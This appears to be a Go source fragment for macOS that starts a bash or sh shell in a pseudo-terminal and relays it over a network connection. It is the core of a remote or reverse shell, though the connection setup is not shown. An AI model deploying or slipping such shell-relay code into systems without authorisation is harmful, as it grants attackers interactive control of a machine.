// +build darwin

package main

import (
    "net"
    "os/exec"
    "io"
    "github.com/creack/pty"
)

const (
	// Shell constants
	bash = "/bin/bash"
	sh   = "/bin/sh"
)

func GetSystemShell() string {
	if exists(bash) {
		return bash
	}
	return sh
}

func RunShell(conn net.Conn, cmd *exec.Cmd) {
    ptmx, err := pty.Start(cmd)
    if err != nil {
        panic(err)
    }
    defer ptmx.Close()

	go func() {
		io.Copy(ptmx, conn)
	}()
	
	io.Copy(conn, ptmx)
}
